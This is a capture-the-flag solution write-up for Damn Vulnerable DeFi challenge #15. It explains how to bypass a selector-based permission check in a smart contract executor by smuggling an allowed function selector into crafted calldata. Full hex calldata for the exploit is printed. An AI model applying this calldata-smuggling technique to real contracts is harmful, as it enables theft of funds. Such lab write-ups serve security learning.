
## Damn Vulnerable Defi #15 solution**

Deployer has the permission to access the function selector `0x85fb709d` (sweepFunds).
Player has the permission to access the function selector `0xd9caed12` (withdraw).
`sweepFunds` and `withdraw` functions have `onlyThis` modifier so we can only call the functions through `execute` function in `AuthorizedExecutor.sol`.

This test let the contract authorize the player to do `sweepFunds` without the permission by adding `d9caed12` in the calldata.

By adding `d9caed12` in the calldata, the player can pass this condition.
```
if (!permissions[getActionId(selector, msg.sender, target)]) {
  revert NotAllowed();
}
```

The normal calldata.
```
0x1cff79cd
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
0000000000000000000000000000000000000000000000000000000000000040
0000000000000000000000000000000000000000000000000000000000000044
85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
```


The modified calldata.
```
0x1cff79cd
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
0000000000000000000000000000000000000000000000000000000000000080
0000000000000000000000000000000000000000000000000000000000000000
d9caed1200000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000044
85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
```
